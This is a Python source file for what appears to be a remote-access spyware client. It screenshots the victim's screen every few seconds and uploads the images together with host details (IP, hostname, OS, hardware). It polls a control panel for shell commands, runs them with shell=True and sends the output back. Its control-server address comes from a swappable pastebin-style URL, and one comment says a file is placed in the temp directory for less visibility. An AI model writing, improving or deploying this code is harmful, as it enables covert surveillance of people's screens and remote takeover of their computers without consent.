import os
import time
import uuid
import datetime
import threading
import requests
import platform
import socket
import json
import psutil
import subprocess # New import for running commands
from PIL import ImageGrab, Image
import tempfile # Import tempfile module
from screeninfo import get_monitors

# --- Configuration ---
# Define the file name for the website URL
# Now saving website.txt in the system's temporary directory for less visibility
WEBSITE_URL_FILE = os.path.join(tempfile.gettempdir(), "website.txt")
PASTEBIN_URL = "http://127.0.0.1:8080/panel/website.txt" # The URL to download the website content from

# These URLs will be dynamically set after reading from the file
UPLOAD_URL = ""
COMMAND_HANDLER_URL = ""

PC_ID_FILE = "pc_id.txt" # This can remain in the script's directory or also be moved to tempdir if desired
SCREENSHOT_INTERVAL = 5 # Take and upload a screenshot and PC info every 5 seconds
COMMAND_POLLING_INTERVAL = 2 # Poll for new commands every 2 seconds
WEBSITE_DOWNLOAD_INTERVAL = 60 # Download website.txt every 60 seconds (1 minute)
SCREENSHOT_QUALITY = 80
SCREENSHOT_EXTENSION = "webp"
FIXED_SCREENSHOT_FILENAME = f"latest_screenshot.{SCREENSHOT_EXTENSION}"

# --- Global Variables ---
pc_id = None
running = True
periodic_timer = None
command_polling_timer = None
website_download_timer = None # New timer for periodic website.txt download
website_base_url = None # To store the base URL read from the file

# --- Utility Functions ---

def download_website_url_file(url, file_name):
    """
    Downloads content from a given URL and saves it to a specified file.
    """
    print(f"Attempting to download website URL from {url} to {file_name}...")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status() # Raise an HTTPError for bad responses (4xx or 5xx)
        with open(file_name, "w") as f:
            f.write(response.text.strip()) # Write the content, stripping extra whitespace
        print(f"Successfully downloaded content to '{file_name}'.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading from {url}: {e}")
        return False
    except Exception as e:
        print(f"An unexpected error occurred during download: {e}")
        return False

def read_website_url(file_name):
    """
    Reads the website URL from a specified text file.
    Returns the URL string or None if the file is not found or empty.
    """
    if os.path.exists(file_name):
        try:
            with open(file_name, "r") as f:
                url = f.readline().strip()
                if url:
                    print(f"Loaded website URL from {file_name}: {url}")
                    return url
                else:
                    print(f"Warning: {file_name} is empty.")
                    return None
        except Exception as e:
            print(f"Error reading website URL from {file_name}: {e}")
            return None
    else:
        print(f"Error: Website URL file '{file_name}' not found.")
        return None

def get_or_create_pc_id():
    """
    Reads the unique PC ID from a file, or generates a new one if it doesn't exist.
    This ID is used to organize uploaded files and info on the server.
    """
    global pc_id
    # If you also want to move PC_ID_FILE to tempdir, you would change this line:
    # pc_id_path = os.path.join(tempfile.gettempdir(), PC_ID_FILE)
    # if os.path.exists(pc_id_path):
    #    with open(pc_id_path, "r") as f:
    #        pc_id = f.read().strip()
    #        print(f"Loaded PC ID: {pc_id}")
    # else:
    #    pc_id = str(uuid.uuid4())
    #    with open(pc_id_path, "w") as f:
    #        f.write(pc_id)
    #    print(f"Generated new PC ID: {pc_id}")

    # Keeping PC_ID_FILE in the script's directory as per original code,
    # unless explicitly asked to move it.
    if os.path.exists(PC_ID_FILE):
        with open(PC_ID_FILE, "r") as f:
            pc_id = f.read().strip()
            print(f"Loaded PC ID: {pc_id}")
    else:
        pc_id = str(uuid.uuid4())
        with open(PC_ID_FILE, "w") as f:
            f.write(pc_id)
        print(f"Generated new PC ID: {pc_id}")
    return pc_id

def get_pc_info():
    """
    Gathers various PC information including public IP, OS details, screen resolution,
    CPU, and RAM information.
    """
    info = {}

    # Public IP
    try:
        info['public_ip'] = requests.get('https://api.ipify.org').text
    except requests.exceptions.RequestException:
        info['public_ip'] = 'N/A'
    except Exception as e:
        info['public_ip'] = f'Error: {e}'

    # Operating System
    info['os_name'] = platform.system()
    info['os_version'] = platform.release()
    info['os_architecture'] = platform.machine()
    info['hostname'] = socket.gethostname() # Add hostname

    # Screen Resolution
    try:
        monitors = get_monitors()
        if monitors:
            info['screen_width'] = monitors[0].width
            info['screen_height'] = monitors[0].height
        else:
            info['screen_width'] = 'N/A'
            info['screen_height'] = 'N/A'
    except Exception as e:
        info['screen_width'] = 'Error'
        info['screen_height'] = f'Error: {e}'

    # CPU Info
    try:
        info['cpu_cores'] = psutil.cpu_count(logical=False)
        info['cpu_threads'] = psutil.cpu_count(logical=True)
        info['cpu_percent'] = psutil.cpu_percent(interval=1)
    except Exception as e:
        info['cpu_cores'] = 'N/A'
        info['cpu_threads'] = 'N/A'
        info['cpu_percent'] = f'Error: {e}'

    # RAM Info
    try:
        virtual_memory = psutil.virtual_memory()
        info['total_ram_gb'] = round(virtual_memory.total / (1024**3), 2)
        info['available_ram_gb'] = round(virtual_memory.available / (1024**3), 2)
        info['used_ram_percent'] = virtual_memory.percent
    except Exception as e:
        info['total_ram_gb'] = 'N/A'
        info['available_ram_gb'] = 'N/A'
        info['used_ram_percent'] = f'Error: {e}'

    return info

def upload_file(file_path, pc_identifier):
    """
    Uploads a specified file (e.g., screenshot) to the configured UPLOAD_URL,
    including the unique PC ID in the POST data.
    """
    global UPLOAD_URL # Ensure we use the global UPLOAD_URL
    if not UPLOAD_URL:
        print("Error: UPLOAD_URL is not set. Cannot upload file.")
        return False

    if not os.path.exists(file_path):
        print(f"File '{file_path}' not found. Cannot upload.")
        return False

    try:
        with open(file_path, "rb") as f:
            files = {'profile_zip': (os.path.basename(file_path), f, 'image/webp')}
            data = {'pc_id': pc_identifier}
            print(f"  Uploading '{os.path.basename(file_path)}' to {UPLOAD_URL} for PC ID: {pc_identifier}...")
            response = requests.post(UPLOAD_URL, files=files, data=data, timeout=60)

            if response.status_code == 200:
                print(f"  Successfully uploaded '{os.path.basename(file_path)}'. Server response: {response.text}")
                return True
            else:
                print(f"  Failed to upload '{os.path.basename(file_path)}'. Status code: {response.status_code}, Response: {response.text}")
                return False
    except requests.exceptions.RequestException as e:
        print(f"  Network error during upload of '{file_path}': {e}")
        return False
    except Exception as e:
        print(f"  An unexpected error occurred during upload of '{file_path}': {e}")
        return False

def upload_pc_info(pc_info_data, pc_identifier):
    """
    Uploads PC information as JSON to the configured UPLOAD_URL.
    """
    global UPLOAD_URL # Ensure we use the global UPLOAD_URL
    if not UPLOAD_URL:
        print("Error: UPLOAD_URL is not set. Cannot upload PC info.")
        return False

    try:
        headers = {'Content-Type': 'application/json'}
        payload = {
            'pc_id': pc_identifier,
            'pc_info': pc_info_data
        }
        print(f"  Uploading PC info for PC ID: {pc_identifier}...")
        response = requests.post(UPLOAD_URL, json=payload, headers=headers, timeout=60)

        if response.status_code == 200:
            print(f"  Successfully uploaded PC info. Server response: {response.text}")
            return True
        else:
            print(f"  Failed to upload PC info. Status code: {response.status_code}, Response: {response.text}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"  Network error during upload of PC info: {e}")
        return False
    except Exception as e:
        print(f"  An unexpected error occurred during upload of PC info: {e}")
        return False

def execute_command(command):
    """
    Executes a shell command and returns its output.
    """
    try:
        # Use shell=True for simple commands, but be cautious with untrusted input
        # For more secure execution, parse command and arguments explicitly.
        process = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        output = process.stdout
        error = process.stderr
        if process.returncode != 0:
            return f"Error (Exit Code {process.returncode}):\n{error}\nOutput:\n{output}", "failed"
        return output, "completed"
    except subprocess.TimeoutExpired:
        return "Command timed out.", "failed"
    except Exception as e:
        return f"Execution error: {e}", "failed"

def poll_for_commands():
    """
    Polls the server for new commands, executes them, and sends back the output.
    """
    global pc_id, running, command_polling_timer, COMMAND_HANDLER_URL # Ensure we use global COMMAND_HANDLER_URL
    if not running:
        return
    if not COMMAND_HANDLER_URL:
        print("Error: COMMAND_HANDLER_URL is not set. Cannot poll for commands.")
        # Still schedule the next poll, but it will keep failing until URL is set
        if running:
            command_polling_timer = threading.Timer(COMMAND_POLLING_INTERVAL, poll_for_commands)
            command_polling_timer.start()
        return

    try:
        response = requests.get(f"{COMMAND_HANDLER_URL}?action=get_commands&pc_id={pc_id}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data['success'] and data['commands']:
                print(f"  Received {len(data['commands'])} commands.")
                for cmd_obj in data['commands']:
                    command_id = cmd_obj['id']
                    command_to_execute = cmd_obj['command']
                    print(f"  Executing command '{command_to_execute}' (ID: {command_id})...")

                    # Update command status to 'executing'
                    requests.post(COMMAND_HANDLER_URL, data={
                        'action': 'update_command_status',
                        'pc_id': pc_id,
                        'command_id': command_id,
                        'status': 'executing'
                    }, timeout=10)

                    output, status = execute_command(command_to_execute)

                    # Send output back to server
                    requests.post(COMMAND_HANDLER_URL, data={
                        'action': 'send_output',
                        'pc_id': pc_id,
                        'command_id': command_id,
                        'output': output,
                        'status': status
                    }, timeout=60)
                    print(f"  Command (ID: {command_id}) finished with status: {status}")
            else:
                print("  No new commands.")
        else:
            print(f"  Failed to poll commands. Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"  Network error during command polling: {e}")
    except Exception as e:
        print(f"  An unexpected error occurred during command polling: {e}")

    if running:
        command_polling_timer = threading.Timer(COMMAND_POLLING_INTERVAL, poll_for_commands)
        command_polling_timer.start()

def periodic_tasks():
    """
    Performs periodic tasks: taking a screenshot and gathering/uploading PC info.
    """
    global pc_id, running, periodic_timer
    if not running:
        return

    screenshot_path = os.path.join(tempfile.gettempdir(), FIXED_SCREENSHOT_FILENAME)

    # 1. Take and upload screenshot
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, SCREENSHOT_EXTENSION.upper(), quality=SCREENSHOT_QUALITY)
        print(f"Screenshot taken: {screenshot_path}")
        if upload_file(screenshot_path, pc_id):
            print(f"  Uploaded {screenshot_path}.")
        else:
            print(f"  Failed to upload {screenshot_path}.")
    except Exception as e:
        print(f"Error taking or uploading screenshot: {e}")

    # 2. Get and upload PC info
    try:
        pc_info_data = get_pc_info()
        if upload_pc_info(pc_info_data, pc_id):
            print("  PC info uploaded successfully.")
        else:
            print("  Failed to upload PC info.")
    except Exception as e:
        print(f"Error gathering or uploading PC info: {e}")

    # Schedule the next periodic task
    if running:
        periodic_timer = threading.Timer(SCREENSHOT_INTERVAL, periodic_tasks)
        periodic_timer.start()

def periodic_website_download():
    """
    Downloads the website.txt file periodically and updates the global URLs.
    """
    global running, website_base_url, UPLOAD_URL, COMMAND_HANDLER_URL, website_download_timer

    if not running:
        return

    print("Initiating periodic website.txt download...")
    if download_website_url_file(PASTEBIN_URL, WEBSITE_URL_FILE):
        # If download is successful, re-read the URL and update global variables
        new_website_base_url = read_website_url(WEBSITE_URL_FILE)
        if new_website_base_url and new_website_base_url != website_base_url:
            website_base_url = new_website_base_url
            UPLOAD_URL = f"{website_base_url}/panel/upload.php"
            COMMAND_HANDLER_URL = f"{website_base_url}/panel/command_handler.php"
            print(f"Updated UPLOAD_URL: {UPLOAD_URL}")
            print(f"Updated COMMAND_HANDLER_URL: {COMMAND_HANDLER_URL}")
        elif not new_website_base_url:
            print("Warning: Downloaded website.txt is empty or invalid. Keeping old URLs.")
        else:
            print("Website URL has not changed.")
    else:
        print("Failed to download website.txt. Keeping current URLs.")

    # Schedule the next periodic download
    if running:
        website_download_timer = threading.Timer(WEBSITE_DOWNLOAD_INTERVAL, periodic_website_download)
        website_download_timer.start()


def main():
    """
    Entry point for the screenshot, PC info, and command management tool.
    Initializes the PC ID and starts the periodic tasks and command polling.
    """
    global running, website_base_url, UPLOAD_URL, COMMAND_HANDLER_URL # Declare global for modification

    print(f"Tool will take a screenshot and gather PC info every {SCREENSHOT_INTERVAL} seconds.")
    print(f"It will poll for commands every {COMMAND_POLLING_INTERVAL} seconds.")
    print(f"It will download website.txt every {WEBSITE_DOWNLOAD_INTERVAL} seconds.")
    print("Press Ctrl+C to stop the script.")

    # --- Initial download of the website.txt file from Pastebin ---
    # This initial download will set the URLs for the first time
    if not download_website_url_file(PASTEBIN_URL, WEBSITE_URL_FILE):
        print("Failed to perform initial download of website URL file. Exiting.")
        running = False # Stop the script if initial download fails

    if running: # Only proceed if initial download was successful
        # Read the website URL from the downloaded file
        website_base_url = read_website_url(WEBSITE_URL_FILE)

        if website_base_url:
            # Construct the full URLs using the base URL
            UPLOAD_URL = f"{website_base_url}/panel/upload.php"
            COMMAND_HANDLER_URL = f"{website_base_url}/panel/command_handler.php"
            print(f"Configured UPLOAD_URL: {UPLOAD_URL}")
            print(f"Configured COMMAND_HANDLER_URL: {COMMAND_HANDLER_URL}")
        else:
            print("Cannot proceed without a valid website URL after initial download. Exiting.")
            running = False # Stop the script if no URL is found even after download

    if running:
        get_or_create_pc_id()

        # Start periodic tasks (screenshot and info upload)
        periodic_tasks()

        # Start command polling
        poll_for_commands()

        # Start periodic website.txt download
        periodic_website_download()

        # Keep the main thread alive to allow the timers to run
        try:
            while running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nCtrl+C detected. Stopping script...")
            running = False
            if periodic_timer:
                periodic_timer.cancel()
            if command_polling_timer:
                command_polling_timer.cancel()
            if website_download_timer: # Cancel the new timer
                website_download_timer.cancel()
            print("Script stopped.")

if __name__ == "__main__":
    main()
